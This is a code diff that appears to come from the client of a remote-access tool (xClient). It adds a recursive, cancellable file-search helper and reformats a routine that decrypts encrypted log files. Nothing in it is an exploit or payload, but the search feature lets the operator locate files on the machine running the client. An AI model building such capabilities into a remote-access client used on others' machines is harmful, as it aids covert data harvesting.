@@ -1,6 +1,8 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Text;
+using System.Threading;
 using xClient.Core.Cryptography;
 using xClient.Core.Data;
 using xClient.Core.Utilities;
@@ -143,7 +145,83 @@ namespace xClient.Core.Helper
         /// <param name="filename">The filename of the log.</param>
         public static string ReadLogFile(string filename)
         {
-            return File.Exists(filename) ? Encoding.UTF8.GetString(AES.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
+            return File.Exists(filename)
+                ? Encoding.UTF8.GetString(AES.Decrypt(File.ReadAllBytes(filename)))
+                : string.Empty;
+        }
+
+        public class SearchDirectoryQuery
+        {
+            public string Directory;
+            public string SearchString;
+            public bool Recursive;
+            public Action<FileInfo[]> Action;
+            public CancellationToken Token;
+            public ManualResetEvent Reset;
+        }
+
+        public static void SearchDirectory(object query)
+        {
+            if (!(query is SearchDirectoryQuery))
+                return;
+
+            SearchDirectoryImpl((SearchDirectoryQuery) query);
+            ((SearchDirectoryQuery)query).Reset.Set();
+        }
+
+        public static void SearchDirectoryImpl(SearchDirectoryQuery query)
+        {
+            string searchString = query.SearchString;
+            string directory = query.Directory;
+            bool recursive = query.Recursive;
+            Action<FileInfo[]> action = query.Action;
+            CancellationToken token = query.Token;
+
+            string[] searchPatterns = searchString.Contains(",") ? searchString.Split(',') : new[] { searchString };
+            DirectoryInfo currentDir = null;
+            try
+            {
+                currentDir = new DirectoryInfo(directory);
+                foreach (string pattern in searchPatterns)
+                {
+                    if (token.IsCancellationRequested)
+                        return;
+                    action(currentDir.GetFiles(pattern.Trim()));
+                }
+            }
+            catch // To avoid exceptions for unusual directories (recycle bin etc)
+            {
+
+            }
+
+            if (recursive)
+            {
+                try
+                {
+                    if (currentDir != null)
+                        foreach (var subDir in currentDir.GetDirectories())
+                        {
+                            if (token.IsCancellationRequested)
+                                return;
+                            foreach (string pattern in searchPatterns)
+                            {
+                                if (token.IsCancellationRequested)
+                                {
+                                    query.Reset.Set();
+                                    return;
+                                }
+                                query.SearchString = pattern;
+                                query.Directory = subDir.FullName;
+                                query.Recursive = true;
+                                SearchDirectoryImpl(query);
+                            }
+                        }
+                }
+                catch // To avoid UnauthorizedAccessException
+                {
+
+                }
+            }
         }
     }
 }
